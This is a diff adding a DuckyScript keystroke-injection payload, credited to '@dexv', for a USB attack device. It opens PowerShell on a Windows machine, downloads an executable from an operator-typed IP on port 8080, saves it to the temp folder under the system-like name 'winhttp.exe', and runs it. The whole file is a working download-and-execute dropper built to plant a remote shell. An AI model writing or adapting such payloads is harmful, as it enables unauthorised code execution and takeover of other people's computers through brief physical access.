@@ -1,0 +1,26 @@
+REM Script to fetch shell and run
+
+DEFAULT_DELAY 300
+
+REM Init
+REM Written by @dexv
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+STRINGLN $TempPath = [System.IO.Path]::Combine($env:TEMP, "winhttp.exe")
+
+REM Fetch File
+STRING Invoke-WebRequest -Uri "http://
+
+REM Wait for IP type
+WAIT_FOR_BUTTON_PRESS
+
+REM finish file
+STRINGLN :8080/windows" -OutFile $TempPath
+
+DELAY 3000
+STRINGLN Start-Process $TempPath
